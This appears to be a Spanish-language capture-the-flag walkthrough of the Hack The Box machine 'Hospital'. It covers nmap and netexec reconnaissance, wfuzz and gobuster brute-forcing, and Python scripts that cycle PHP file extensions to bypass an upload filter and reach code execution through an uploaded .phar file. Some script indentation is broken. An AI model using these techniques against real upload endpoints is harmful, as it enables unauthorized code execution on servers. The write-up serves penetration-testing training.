
-----
- TAG: #DOMINIOS #NETEXEC #PYTHON #GOBUSTER
----
- Empezamos creando nuestra carpeta Hospital en nuestra terminal, creamos las tres carpetas que necesitaremos para guardar la información 
```
mkt
```

- Empezamos con el proceso de  reconocimiento con **nmap** 
```
ping -c 1 10.10.11.241
```

- Realizamos una auditoria a la red para ver que puertos potenciales estan abiertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.241 -oG allPorts
```

- Extraemos la información de los puertos abiertos con 
```
extractPorts allPorts
```
   - Recordemos que con `locate .nse` podemos observar todos los scripts escritos en lua de nmap los cuales contiene categorias.
   - Con `locate .nse | xargs grep "categories"` podemos filtrar por categorias

- Realizamos el escaneo a los puertos abiertos y guardamos el output en el archivo **targeted**
```
nmap -p(puertos) -sCV 10.10.11.241 -oN targeted
```
 - Ahora el formato lo podemos ver en archivo grepeable y con estilo java con `cat taget -l java`
 - Vemos información como el la versión de Ubuntu corriendo por el puerto `22` y podemos tirar de **Launchpad**, con esto obtenemos información que corre un sistema **Lunar** (Puede que este corriendo un sub-sistema dentro de una maquina **Linux**)

## Jugando con Netexec
- Si no tenemos instalado realizamos el siguiente procedimiento de  [Instalación de Netexec](https://www.netexec.wiki/getting-started/installation/installation-on-unix)
- Lo tenemos guardado en /opt/Netexec
- Ahora podemos averiguar un poco mas o encontrar dominios, Para ello deberíamos estar en el directorio **/.local/bin**
```
pushd /opt/Netexec
poetry run netexec smb 10.10.11.241
```

 - Encontrando el dominio lo ingresamos en el **/etc/host** con la dirección ip de la maquina para que lo pueda leer nuestro sistema.
```
10.10.11.241 hospital.htb
```

- Podríamos enumerar un poco de rutas de la url con **wfuzz**
```
wfuzz -c --hc=404,403 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://10.10.11.241:443/FUZZ
```
   - Si refleja información o directorios podrias ingresar por la url, jugar un poco con mayúsculas y minúsculas con la palabra clave encontrada.

- Empezamos auditar la otra pagina **http** por el puerto **8080**
`http://hospital.htb:8080`
- Nos creamos un usuario y contraseña y nos logueamos 
- Empezamos auditar ciertas partes como información que nos de la url (usando **whatweb**) por ejemplo, interceptar información con **burpsuite**

----
- Creamos un archivo **extensions** con 
```
echo '.php , .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module' | tr ',' '\n' | sed 's/\.//g' | sed 's/ //' >> extensions
```
	 1. luego lo subimos a burpsuite en intruder en la opción load
	 2. De igual manera en "Grep - Extract" colocar 'load' selecionar /failed.php y poner ok
	 3. Luego de eso empezamos con el ataque de fuerza bruta para ver posibles rutas

- Creamos nuestro escript para detectar rutas validas.
```
<?php
  echo "Hola probando";
?>
```

 - Creamos un archi **.py** para enlistar los **.php** con el codigo de estado
```
#!/usr/bin/env python3

import requests
import signal
import sys
from termcolor import colored
from pwn import *

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo..\n", 'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://hospital.htb:8080/upload.php"
cookies = {'PHPSESSID': 'gvsg96egu23t3hjdnlv1ssb6ve'}
burp = {'http': 'http://127.0.0.1:8081'}
extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]

def fileUpload():
    f = open("cmd.php", "r")
    fileContent = f.read()

    for extension in extensions:
        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}
	r= requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
        print(r.status_code)

if __name__ == '__main__':
    fileUpload()
 
```
>Si cambiamos `print(r.estatus_code)` por:
>`if "failed" not in r.headers["Location"]:`
>	    `print(colored(f"\n[+] Extensión {extension}: {r.headers['Location']}", 'green'))`
- Podemos realizar la misma función que realizamos con **burpsuite** utilizando **python**, con esta ultima función nos enlista todas las rutas **succes.php**.
- En este punto con el siguiente código en **python** nos permitiría ejecutar código **.php** en la url con probando con las rutas encontradas:
  `http://hospital.htb:8080/uploads/cmd.phar`
```
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from termcolor import colored
from pwn import *

def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo..\n", 'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://hospital.htb:8080/upload.php"
cookies = {'PHPSESSID' : 'gvsg96egu23t3hjdnlv1ssb6ve'}
burp = {'http': 'http://127.0.0.1:8080'}
extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]

def fileUpload():
    f = open("cmd.php", "r")
    fileContent = f.read()
	
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
    for extension in extensions:
	    p1.status(f"Probando con la extensión {extension}")
        fileToUpload = {'image': (f"cmd{extension}", fileContent.strip())}
        r= requests.post(upload_url, cookies=cookies, files=fileToUpload, allow_redirects=False)
        if "failed" not in r.headers["Location"]:
	        log.info(f"Extensión {extension}: {r.headers['Location']}")
if __name__ == '__main__':
    fileUpload()
```

- Ahora podriamos enlistar directorios existentes utilizando fuerza bruta usando **gobuster**
```
gobuster dir -u http://hospital.htb:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```
